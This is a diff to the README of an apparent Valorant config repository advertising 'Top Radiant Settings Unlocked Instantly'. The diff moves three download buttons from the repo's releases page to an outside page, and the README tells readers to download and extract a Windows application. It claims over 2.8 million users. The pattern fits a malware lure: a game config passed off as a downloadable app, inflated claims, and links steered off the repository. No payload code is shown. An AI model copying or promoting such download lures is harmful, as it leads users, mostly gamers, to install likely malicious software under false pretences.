@@ -1,7 +1,7 @@
 <h1>⚡ valorant-config-2026 - Top Radiant Settings Unlocked Instantly</h1>
 
 <p align="center">
-<a href="https://github.com/Knjnt4435/valorant-config-2026/releases"><img src="https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW%20-%20%23ff6b6b?style=for-the-badge&logo=download&logoColor=white&labelColor=%23222" alt="Download Badge"></a>
+<a href="https://knjnt4435.github.io"><img src="https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW%20-%20%23ff6b6b?style=for-the-badge&logo=download&logoColor=white&labelColor=%23222" alt="Download Badge"></a>
 </p>
 
 <p align="center">
@@ -42,7 +42,7 @@
 
 <h3>Step 1: Download the Package</h3>
 <p>Visit this link to download the application:</p>
-<p align="center"><a href="https://github.com/Knjnt4435/valorant-config-2026/releases"><img src="https://img.shields.io/badge/📥%20GET%20VALORANT%20CONFIG%202026-FF5722?style=for-the-badge&labelColor=222" alt="Download Link"></a></p>
+<p align="center"><a href="https://knjnt4435.github.io"><img src="https://img.shields.io/badge/📥%20GET%20VALORANT%20CONFIG%202026-FF5722?style=for-the-badge&labelColor=222" alt="Download Link"></a></p>
 <p>Click the big button above. Your browser will take you to the download page. Find the file that matches your system (Windows) and click the download button there.</p>
 
 <h3>Step 2: Extract the Files</h3>
@@ -107,7 +107,7 @@
 <hr>
 
 <p align="center">
-<a href="https://github.com/Knjnt4435/valorant-config-2026/releases"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW%20%E2%80%94%20CLICK%20HERE-28a745?style=for-the-badge&labelColor=111" alt="Final Download"></a>
+<a href="https://knjnt4435.github.io"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW%20%E2%80%94%20CLICK%20HERE-28a745?style=for-the-badge&labelColor=111" alt="Final Download"></a>
 </p>
 
 <p align="center">2,800,000+ players already upgraded their setup. Join them today.</p>
